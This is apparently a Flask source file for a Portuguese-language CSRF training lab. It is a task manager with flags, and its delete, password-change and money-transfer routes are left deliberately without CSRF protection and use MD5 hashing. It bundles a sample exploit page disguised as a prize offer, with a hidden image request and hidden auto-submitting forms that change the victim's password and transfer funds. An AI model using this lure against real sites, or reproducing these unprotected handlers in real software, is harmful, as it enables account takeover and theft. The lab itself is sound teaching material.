#!/usr/bin/env python3
"""
🎭 Cross-Site Request Forgery (CSRF) - Basic Lab
Laboratório de Vulnerabilidades CSRF

Porta: 5070
Dificuldade: 🟢 Básico
Pontos: 10

VULNERABILIDADES:
1. GET-based CSRF em delete task
2. POST-based CSRF em change password
3. POST-based CSRF em transfer money
4. No CSRF token validation

FLAGS:
- FLAG{get_csrf_success} - Delete task via GET CSRF
- FLAG{post_csrf_password} - Change password via POST CSRF
- FLAG{post_csrf_transfer} - Transfer money via POST CSRF

USUÁRIOS DE TESTE:
- alice / password123 (saldo: $1000)
- bob / password456 (saldo: $500)
"""

from flask import Flask, request, render_template_string, session, redirect
import sqlite3
from functools import wraps
import hashlib

app = Flask(__name__)
app.secret_key = 'csrf_lab_secret_key'

# Banco de dados
def init_db():
    conn = sqlite3.connect(':memory:', check_same_thread=False)
    c = conn.cursor()

    # Tabela de usuários
    c.execute('''CREATE TABLE users
                 (id INTEGER PRIMARY KEY, username TEXT UNIQUE,
                  password TEXT, email TEXT, balance REAL)''')

    # Tabela de tarefas
    c.execute('''CREATE TABLE tasks
                 (id INTEGER PRIMARY KEY, user_id INTEGER, title TEXT,
                  description TEXT, completed INTEGER)''')

    # Usuários de teste
    users = [
        (1, 'alice', hashlib.md5(b'password123').hexdigest(), 'alice@example.com', 1000.0),
        (2, 'bob', hashlib.md5(b'password456').hexdigest(), 'bob@example.com', 500.0),
    ]
    c.executemany('INSERT INTO users VALUES (?, ?, ?, ?, ?)', users)

    # Tarefas de teste
    tasks = [
        (1, 1, 'Comprar leite', 'Ir ao supermercado', 0),
        (2, 1, 'Estudar CSRF', 'Ler documentação', 0),
        (3, 1, 'Importante: Não deletar!', 'Esta tarefa contém informações importantes', 0),
        (4, 2, 'Revisar código', 'Pull request #123', 0),
        (5, 2, 'Meeting às 15h', 'Reunião com cliente', 0),
    ]
    c.executemany('INSERT INTO tasks VALUES (?, ?, ?, ?, ?)', tasks)

    conn.commit()
    return conn

db = init_db()

def login_required(f):
    """Decorator para verificar se usuário está logado"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect('/login')
        return f(*args, **kwargs)
    return decorated_function

# HTML Templates
HOME_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>🎭 CSRF Lab - Task Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 {
            color: #667eea;
            margin-bottom: 20px;
        }
        .user-info {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .task {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 10px;
            margin: 10px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .task-info h3 {
            color: #333;
            margin-bottom: 5px;
        }
        .task-info p {
            color: #666;
            font-size: 0.9em;
        }
        .btn {
            padding: 8px 15px;
            border-radius: 5px;
            text-decoration: none;
            margin: 0 5px;
            border: none;
            cursor: pointer;
        }
        .btn-delete {
            background: #dc3545;
            color: white;
        }
        .btn-primary {
            background: #667eea;
            color: white;
        }
        .btn-success {
            background: #28a745;
            color: white;
        }
        .section {
            margin: 30px 0;
        }
        .flag {
            background: #d4edda;
            border: 2px solid #28a745;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
        }
        input[type="text"], input[type="password"], input[type="number"] {
            width: 100%;
            padding: 10px;
            border: 2px solid #ddd;
            border-radius: 5px;
            margin: 10px 0;
        }
        form {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📝 Task Manager</h1>

        <div class="user-info">
            <strong>👤 Logado como:</strong> {{ username }} |
            <strong>💰 Saldo:</strong> ${{ balance }} |
            <a href="/logout" class="btn btn-delete">Sair</a>
        </div>

        {% if flag %}
        <div class="flag">
            <h3>🚩 {{ flag }}</h3>
        </div>
        {% endif %}

        <div class="section">
            <h2>📋 Minhas Tarefas</h2>
            {% for task in tasks %}
            <div class="task">
                <div class="task-info">
                    <h3>{{ task[2] }}</h3>
                    <p>{{ task[3] }}</p>
                </div>
                <div>
                    <a href="/delete_task?id={{ task[0] }}" class="btn btn-delete"
                       onclick="return confirm('Tem certeza?')">🗑️ Deletar</a>
                </div>
            </div>
            {% endfor %}

            <div style="margin-top: 20px;">
                <a href="/add_task" class="btn btn-success">➕ Nova Tarefa</a>
            </div>
        </div>

        <div class="section">
            <h2>🔒 Alterar Senha</h2>
            <form method="POST" action="/change_password">
                <input type="password" name="current_password" placeholder="Senha atual" required>
                <input type="password" name="new_password" placeholder="Nova senha" required>
                <button type="submit" class="btn btn-primary">Alterar Senha</button>
            </form>
        </div>

        <div class="section">
            <h2>💸 Transferir Dinheiro</h2>
            <form method="POST" action="/transfer">
                <input type="text" name="to_user" placeholder="Nome do usuário" required>
                <input type="number" name="amount" placeholder="Valor" min="1" step="0.01" required>
                <button type="submit" class="btn btn-primary">Transferir</button>
            </form>
        </div>

        <div style="margin-top: 30px; padding: 20px; background: #fff3cd; border-radius: 10px;">
            <h3>🎯 Objetivos (CSRF Attack)</h3>
            <p><strong>Para testar CSRF, crie uma página HTML maliciosa que:</strong></p>
            <p>1️⃣ Delete uma tarefa via GET (exemplo: /delete_task?id=1)</p>
            <p>2️⃣ Altere a senha do usuário via POST</p>
            <p>3️⃣ Transfira dinheiro para outro usuário via POST</p>
            <br>
            <p><strong>💡 Dica:</strong> Abra esta app em uma aba e sua página maliciosa em outra!</p>
        </div>

        <div style="margin-top: 20px; padding: 20px; background: #f8d7da; border-radius: 10px;">
            <h3>⚠️ Vulnerabilidade</h3>
            <p>Esta aplicação NÃO tem proteção CSRF!</p>
            <p>• Sem tokens CSRF</p>
            <p>• Sem validação de Origin/Referer</p>
            <p>• Aceita requisições cross-origin</p>
        </div>
    </div>
</body>
</html>
'''

LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>🔐 Login - CSRF Lab</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
        }
        h1 {
            color: #667eea;
            margin-bottom: 30px;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 1em;
            margin-bottom: 15px;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1em;
            cursor: pointer;
        }
        button:hover { background: #5568d3; }
        .error {
            background: #f8d7da;
            color: #721c24;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .users-info {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>🔐 Login</h1>

        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}

        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Entrar</button>
        </form>

        <div class="users-info">
            <strong>👥 Usuários de Teste:</strong><br>
            • alice / password123 ($1000)<br>
            • bob / password456 ($500)
        </div>
    </div>
</body>
</html>
'''

EXPLOIT_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>🎁 Você Ganhou um Prêmio!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #ffd89b 0%, #19547b 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 600px;
        }
        h1 { color: #19547b; margin-bottom: 20px; }
        .prize {
            font-size: 3em;
            margin: 20px 0;
        }
        button {
            padding: 15px 30px;
            background: #28a745;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1.2em;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎉 Parabéns!</h1>
        <div class="prize">💰 $1,000,000</div>
        <p>Você foi selecionado para receber um prêmio!</p>
        <p>Clique abaixo para reivindicar:</p>
        <br>
        <button onclick="claim()">Reivindicar Prêmio</button>

        <!-- CSRF Exploits ocultos -->

        <!-- 1. GET CSRF - Deleta tarefa -->
        <img src="http://localhost:5070/delete_task?id=3" style="display:none">

        <!-- 2. POST CSRF - Muda senha (auto-submit invisível) -->
        <iframe name="csrf_frame" style="display:none"></iframe>
        <form id="csrf_password" action="http://localhost:5070/change_password"
              method="POST" target="csrf_frame">
            <input name="current_password" value="password123">
            <input name="new_password" value="hacked123">
        </form>

        <!-- 3. POST CSRF - Transfere dinheiro -->
        <form id="csrf_transfer" action="http://localhost:5070/transfer"
              method="POST" target="csrf_frame">
            <input name="to_user" value="bob">
            <input name="amount" value="500">
        </form>
    </div>

    <script>
    function claim() {
        alert('Processando seu prêmio...');
        // Executa CSRF attacks
        document.getElementById('csrf_password').submit();
        setTimeout(() => {
            document.getElementById('csrf_transfer').submit();
        }, 1000);
        setTimeout(() => {
            alert('Obrigado! Verifique seu email em 24-48 horas.');
        }, 2000);
    }
    </script>
</body>
</html>
'''

@app.route('/')
@login_required
def index():
    """Página inicial"""
    user_id = session['user_id']
    c = db.cursor()

    # Busca usuário
    c.execute('SELECT username, balance FROM users WHERE id = ?', (user_id,))
    user = c.fetchone()

    # Busca tarefas
    c.execute('SELECT * FROM tasks WHERE user_id = ? ORDER BY id', (user_id,))
    tasks = c.fetchall()

    flag = session.pop('flag', None)

    return render_template_string(HOME_TEMPLATE,
                                  username=user[0],
                                  balance=user[1],
                                  tasks=tasks,
                                  flag=flag)

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login"""
    if request.method == 'GET':
        return render_template_string(LOGIN_TEMPLATE)

    username = request.form.get('username')
    password = request.form.get('password')
    password_hash = hashlib.md5(password.encode()).hexdigest()

    c = db.cursor()
    c.execute('SELECT id, username FROM users WHERE username = ? AND password = ?',
              (username, password_hash))
    user = c.fetchone()

    if user:
        session['user_id'] = user[0]
        session['username'] = user[1]
        return redirect('/')
    else:
        return render_template_string(LOGIN_TEMPLATE, error='Credenciais inválidas')

@app.route('/logout')
def logout():
    """Logout"""
    session.clear()
    return redirect('/login')

@app.route('/delete_task')
@login_required
def delete_task():
    """
    VULNERÁVEL: GET-based CSRF
    Deleta tarefa sem validação CSRF
    """
    task_id = request.args.get('id')
    user_id = session['user_id']

    c = db.cursor()

    # Verifica se tarefa pertence ao usuário
    c.execute('SELECT user_id FROM tasks WHERE id = ?', (task_id,))
    task = c.fetchone()

    if task and task[0] == user_id:
        # VULNERÁVEL ❌ - Sem proteção CSRF!
        c.execute('DELETE FROM tasks WHERE id = ?', (task_id,))
        db.commit()

        # FLAG
        if task_id == '3':
            session['flag'] = 'FLAG{get_csrf_success} - Tarefa deletada via GET CSRF!'

        return redirect('/')
    else:
        return 'Tarefa não encontrada', 404

@app.route('/change_password', methods=['POST'])
@login_required
def change_password():
    """
    VULNERÁVEL: POST-based CSRF
    Muda senha sem validação CSRF
    """
    current_password = request.form.get('current_password')
    new_password = request.form.get('new_password')
    user_id = session['user_id']

    c = db.cursor()
    c.execute('SELECT password FROM users WHERE id = ?', (user_id,))
    user = c.fetchone()

    current_hash = hashlib.md5(current_password.encode()).hexdigest()

    if user[0] == current_hash:
        # VULNERÁVEL ❌ - Sem proteção CSRF!
        new_hash = hashlib.md5(new_password.encode()).hexdigest()
        c.execute('UPDATE users SET password = ? WHERE id = ?', (new_hash, user_id))
        db.commit()

        # FLAG
        session['flag'] = 'FLAG{post_csrf_password} - Senha alterada via POST CSRF!'

        return redirect('/')
    else:
        return 'Senha atual incorreta', 400

@app.route('/transfer', methods=['POST'])
@login_required
def transfer():
    """
    VULNERÁVEL: POST-based CSRF
    Transfere dinheiro sem validação CSRF
    """
    to_user = request.form.get('to_user')
    amount = float(request.form.get('amount'))
    from_user_id = session['user_id']

    c = db.cursor()

    # Busca usuário de destino
    c.execute('SELECT id, username FROM users WHERE username = ?', (to_user,))
    to_user_data = c.fetchone()

    if not to_user_data:
        return 'Usuário não encontrado', 404

    to_user_id = to_user_data[0]

    # Verifica saldo
    c.execute('SELECT balance FROM users WHERE id = ?', (from_user_id,))
    balance = c.fetchone()[0]

    if balance < amount:
        return 'Saldo insuficiente', 400

    # VULNERÁVEL ❌ - Sem proteção CSRF!
    # Transfere
    c.execute('UPDATE users SET balance = balance - ? WHERE id = ?', (amount, from_user_id))
    c.execute('UPDATE users SET balance = balance + ? WHERE id = ?', (amount, to_user_id))
    db.commit()

    # FLAG
    session['flag'] = f'FLAG{{post_csrf_transfer}} - Transferiu ${amount} para {to_user} via CSRF!'

    return redirect('/')

@app.route('/exploit')
def exploit_page():
    """
    Página de exploit de exemplo
    Use esta página para testar CSRF
    """
    return render_template_string(EXPLOIT_TEMPLATE)

if __name__ == '__main__':
    print('=' * 60)
    print('🎭 CSRF - Basic Lab')
    print('=' * 60)
    print('🌐 URL: http://localhost:5070')
    print('📊 Dificuldade: 🟢 Básico')
    print('🎯 Pontos: 10')
    print('')
    print('👥 Usuários de Teste:')
    print('  • alice / password123 (saldo: $1000)')
    print('  • bob / password456 (saldo: $500)')
    print('')
    print('🚩 Flags:')
    print('  1. FLAG{get_csrf_success} - Delete task via GET CSRF')
    print('  2. FLAG{post_csrf_password} - Change password via POST CSRF')
    print('  3. FLAG{post_csrf_transfer} - Transfer money via POST CSRF')
    print('')
    print('💡 Como testar:')
    print('  1. Faça login como alice')
    print('  2. Acesse http://localhost:5070/exploit em OUTRA aba')
    print('  3. Clique em "Reivindicar Prêmio"')
    print('  4. Volte para a aba da aplicação e veja o resultado')
    print('')
    print('🔧 Ou crie seu próprio exploit HTML!')
    print('=' * 60)

    app.run(host='0.0.0.0', port=5070, debug=False)
